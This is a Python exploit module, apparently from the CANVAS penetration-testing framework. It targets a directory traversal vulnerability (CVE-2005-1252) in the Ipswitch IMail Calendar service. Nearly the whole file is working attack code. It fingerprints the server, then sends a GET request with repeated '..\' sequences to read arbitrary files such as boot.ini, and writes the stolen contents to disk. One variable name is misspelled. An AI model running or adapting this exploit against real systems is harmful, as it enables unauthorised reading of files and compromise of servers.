#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

NAME='Ipswitch Calendar Directory Traversal'
DESCRIPTION='IpSwitch Calendar Directory Traversal'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IPSwitch"
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']='IMail 8.13 up to 8.2p1 '
DOCUMENTATION['Reference']='http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=242'
DOCUMENTATION['CVE Name'] = 'CVE-2005-1252'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1252'
DOCUMENTATION['CVSS'] = 5.0
DOCUMENTATION['Date public']=''

VERSION='1.0'

PROPERTY = {}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']

NOTES="""
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
    1: ['IMail 8.13',0]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.port=8484
        self.badstring=''
        self.ssl=0
        self.version=0
        self.filename='boot.ini'
        return
        
    def test(self):
        self.getArgs()
        
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('No connection could be established')
            return 0
        s.websend('GET / HTTP/1.1\r\nHost: localhost\r\nConnection: Close\r\n\r\n')
        data=''
        try:
            data=self.webrecv(s)
        except:
            pass
        self.log('Server returned: %s'%(prettyprint(data[:256])))
        if data.count('Ipswitch')>0:
            self.version=1
            return 1
        return 0

    def getArgs(self):
        self.host=self.target.interface 
        return 
    
    def run(self):
        self.getArgs()
        
        if self.version==0:
            self.test()
            if self.version==0:
                self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
                return 0
        self.info,unused=targets[self.version]
        self.filename=self.argsDict.get('filename',self.filename)
        self.setInfo('%s attacking %s:%d (in progress)'%(NAME,self.host,self.port))
        self.log('Attacking %s:%d'%(self.host,self.port))
        try:
            s=self.gettcpsock()
            s.connect((self.host,self.port))
            url='\\'+'..\\'*10+self.filename
            request='GET /blah.jsp?%s HTTP/1.1\r\nHost: localhost\r\nConnection: Close\r\n\r\n'%(url)
            self.log('Sending %s'%request)
            s.websend(request)
            response=self.webrecv(s)
            index=response.find('\r\n\r\n')
            body=response[index+4:]
            self.log('Recveived %d bytes'%(len(reponse)))
            self.log('Body: %s'%(prettyprint(body[:1024])))
            output=file('tmpfile.bin','wb')
            output.write(body)
            output.close()
            self.log('Wrote output to tmpfile.bin')
            self.setInfo('%s attacking %s:%d - done (success!)'%(NAME,self.host,self.port))
            return 1
        except:
            self.log('An error occured')
            import traceback
            traceback.print_exc()
            self.setInfo('%s attacking %s:%d - done (failed!)'%(NAME,self.host,self.port))
            return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version [ -O ssl:1 ] -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [1,0,None]:
        ret.interact()
